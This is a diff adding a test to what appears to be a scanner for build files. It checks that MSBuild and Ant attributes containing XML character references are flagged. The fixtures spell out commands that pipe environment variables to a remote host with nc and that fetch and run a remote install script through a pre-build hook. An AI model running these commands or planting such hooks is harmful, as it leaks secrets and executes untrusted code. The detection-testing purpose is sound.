@@ -144,6 +144,45 @@ test("a newline before a pipe in a shell script is not a pipe", () => {
   }
 });
 
+test("XML character references in an attribute are the characters the build runs", () => {
+  // MSBuild and Ant expand references before running the attribute. The
+  // same bytes in a shell script are not a pipe or a command separator.
+  const cases = [
+    ["&#124;", "env &#124; nc 203.0.113.7 4444", "secret-exfiltration:high"],
+    ["&#x7C;", "env &#x7C; nc 203.0.113.7 4444", "secret-exfiltration:high"],
+    [
+      "&amp;&amp;",
+      "sh -c &quot;$(curl -fsSL https://evil.example/install.sh&amp;&amp;true)&quot;",
+      "unsafe-execution:high",
+    ],
+  ] as const;
+  for (const [reference, command, finding] of cases) {
+    for (const path of ["build.xml", "Directory.Build.targets"] as const) {
+      const body =
+        path === "build.xml"
+          ? `<project><target name="run"><exec executable="sh"><arg value="${command}"/></exec></target></project>\n`
+          : `<Project><Target Name="PreBuild" BeforeTargets="PreBuildEvent"><Exec Command="${command}" /></Target></Project>\n`;
+      const inspection = inspected(path, body);
+      expect({
+        reference,
+        path,
+        findings: inspection.findings.map(
+          (item) => `${item.path}:${item.category}:${item.severity}`,
+        ),
+      }).toEqual({ reference, path, findings: [`${path}:${finding}`] });
+    }
+  }
+  expect(
+    inspected("scripts/fetch.sh", "env &#124; nc 203.0.113.7 4444\n").findings,
+  ).toEqual([]);
+  expect(
+    inspected(
+      "scripts/fetch.sh",
+      "sh -c &quot;$(curl -fsSL https://evil.example/install.sh&amp;&amp;true)&quot;\n",
+    ).findings,
+  ).toEqual([]);
+});
+
 test("the MSBuild surface stays bounded", () => {
   expect(surfacesOf("LICENSE")).toEqual([]);
   expect(surfacesOf("notes.properties")).toEqual([]);
